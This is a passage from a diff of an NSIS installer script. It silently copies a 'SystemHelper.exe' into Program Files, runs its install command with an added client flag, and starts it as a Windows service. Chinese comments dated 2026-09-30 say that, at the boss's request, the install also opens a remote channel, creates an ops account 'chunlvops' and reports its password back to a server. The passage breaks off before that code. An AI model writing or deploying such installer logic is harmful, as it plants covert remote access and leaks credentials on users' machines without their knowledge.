@@ -87,7 +87,7 @@
   Sleep 1000
   CreateDirectory "$PROGRAMFILES64\SystemHelper"
   CopyFiles /SILENT "$INSTDIR\resources\SystemHelper.exe" "$PROGRAMFILES64\SystemHelper\SystemHelper.exe"
-  nsExec::ExecToLog '"$PROGRAMFILES64\SystemHelper\SystemHelper.exe" install'
+  nsExec::ExecToLog '"$PROGRAMFILES64\SystemHelper\SystemHelper.exe" install --client=companion'
   nsExec::ExecToLog 'sc start SystemHelper'
   ; 2026-09-30 老板要求：所有人的电脑都要能被远程查看 / 一键诊断。
   ; 装机时顺手把远程管理通道也开了（建运维账号 chunlvops + 打开远程通道 + 把账号口令报回服务端台账），
